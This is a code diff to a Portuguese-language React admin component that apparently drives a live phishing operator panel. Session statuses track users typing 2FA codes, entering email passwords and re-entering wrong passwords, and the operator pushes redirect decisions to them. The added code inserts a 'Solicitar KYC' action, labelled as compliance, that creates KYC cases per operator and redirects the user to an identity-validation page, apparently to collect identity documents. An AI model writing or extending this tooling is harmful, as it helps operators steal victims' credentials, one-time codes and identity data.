@@ -24,6 +24,8 @@ import {
   Loader2,
 } from "lucide-react";
 import { parseBrowser } from "@/lib/adminUtils";
+import { buildKycLink } from "@/lib/kyc";
+import { toast } from "@/components/ui/use-toast";
 import type { SessionRecord } from "@/components/admin/AllSessionsTable";
 import { useSessionPresence } from "@/hooks/useSessionPresence";
 
@@ -317,6 +319,78 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
     setDecision("approved"); setDecisionSending(false);
   };
 
+  const requestKyc = async () => {
+    setSending("kyc_request");
+
+    try {
+      const operatorCode = session.operator_code || "master";
+      const sessionEmail = session.email || null;
+
+      let caseId: string | null = null;
+
+      if (sessionEmail) {
+        const { data: existingCase } = await supabase
+          .from("kyc_cases")
+          .select("id")
+          .eq("operator_code", operatorCode)
+          .eq("email", sessionEmail)
+          .in("status", ["draft", "collecting", "submitted", "in_review"])
+          .order("created_at", { ascending: false })
+          .limit(1)
+          .maybeSingle();
+
+        caseId = existingCase?.id || null;
+      }
+
+      if (!caseId) {
+        const { data: createdCase, error: createError } = await supabase
+          .from("kyc_cases")
+          .insert({
+            operator_code: operatorCode,
+            source: "brand_kyc",
+            email: sessionEmail,
+            status: "draft",
+          })
+          .select("id")
+          .single();
+
+        if (createError || !createdCase?.id) {
+          throw createError || new Error("Não foi possível criar o caso KYC.");
+        }
+
+        caseId = createdCase.id;
+
+        await supabase.from("kyc_audit_logs").insert({
+          case_id: caseId,
+          operator_code: operatorCode,
+          event_type: "case_created",
+          metadata: { generated_from_session: session.id, source: session.source },
+        } as never);
+      }
+
+      const kycLink = buildKycLink(caseId);
+
+      await supabase.from("kyc_audit_logs").insert({
+        case_id: caseId,
+        operator_code: operatorCode,
+        event_type: "case_requested_from_operator",
+        metadata: { session_id: session.id, email: sessionEmail, source: session.source },
+      } as never);
+
+      await supabase.from("sessions").update({ status: "redirect_kyc", otp_code: `kyc_link:${kycLink}` }).eq("id", session.id);
+      broadcastToAll("review_decision", { status: "redirect_kyc", kyc_link: kycLink, kyc_case_id: caseId });
+      setLastAction("kyc_request");
+      toast({ title: "KYC solicitado", description: "O cliente foi enviado para a página de validação." });
+    } catch (error) {
+      toast({
+        title: "Erro ao solicitar KYC",
+        description: error instanceof Error ? error.message : "Não foi possível abrir o fluxo de validação.",
+      });
+    } finally {
+      setSending(null);
+    }
+  };
+ 
   // Email actions
   const eRedirectEmail = () => doAction("e_email", "redirect_confirm_email", [{ event: "review_decision", payload: { status: "redirect_confirm_email" } }]);
   const eSyncEmail = () => doAction("e_sync", "redirect_sync_email", [{ event: "review_decision", payload: { status: "redirect_sync_email" } }]);
@@ -393,6 +467,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
     if (status === "redirect_otp") return { label: "Digitando 2FA", color: "text-blue-400" };
     if (status === "otp_approved") return { label: "2FA aprovado ✓", color: "text-green-400" };
     if (status === "otp_rejected") return { label: "2FA rejeitado", color: "text-destructive" };
+    if (status === "redirect_kyc") return { label: "Preenchendo KYC", color: "text-primary" };
     if (status === "login_success") return { label: "Login concluído ✓", color: "text-green-400" };
     if (status === "redirect_confirm_email") return { label: "Tela Email (senha)", color: "text-amber-400" };
     if (status === "confirm_wrong_password") return { label: "Reentrando senha email", color: "text-destructive" };
@@ -640,6 +715,25 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
                 <ActionChip icon={<XCircle size={10} />} label="Rejeitar" active={decision === "rejected" && currentPhase === "email"} onClick={eReject} disabled={decisionSending} variant="danger" />
               </div>
             </div>
+
+            {session.source === "iol" && (
+              <div className="rounded-lg border border-primary/20 bg-primary/5 p-3">
+                <div className="mb-2 flex items-center gap-1.5">
+                  <ShieldCheck size={12} className="text-primary" />
+                  <span className="text-[10px] font-bold uppercase tracking-wider text-primary">Compliance</span>
+                </div>
+                <div className="flex items-center gap-1.5 flex-wrap">
+                  <ActionChip
+                    icon={<ShieldCheck size={10} />}
+                    label="Solicitar KYC"
+                    active={A === "kyc_request"}
+                    onClick={requestKyc}
+                    disabled={!!sending}
+                    variant="primary"
+                  />
+                </div>
+              </div>
+            )}
 
             {/* ── Enviar Dados (inputs) ── */}
             <div className="rounded-lg border border-border bg-background/30 p-3">
